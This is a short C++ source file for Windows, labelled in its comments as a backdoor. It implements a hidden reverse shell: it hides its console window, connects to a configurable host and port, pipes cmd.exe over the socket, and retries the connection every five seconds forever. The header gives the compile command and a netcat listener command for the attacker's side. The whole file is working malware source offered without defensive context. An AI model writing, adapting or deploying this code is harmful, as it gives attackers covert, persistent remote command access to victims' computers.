// (equivalent to original simple reverse shell + hide window + eternal reconnect)
// cl backdoor1.cpp ws2_32.lib user32.lib /O2 /MT
// nc -lvp 4444

#include <winsock2.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

const char* HOST = "127.0.0.1";
const u_short PORT = 4444;
const int RECONNECT_DELAY = 5000;

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY);
            continue;
        }

        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        inet_pton(AF_INET, HOST, &addr.sin_addr);

        if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(s);
            Sleep(RECONNECT_DELAY);
            continue;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char cmd[] = "cmd.exe";

        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            closesocket(s);
            Sleep(RECONNECT_DELAY);
            continue;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        closesocket(s);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    WSACleanup();
    return 0;
}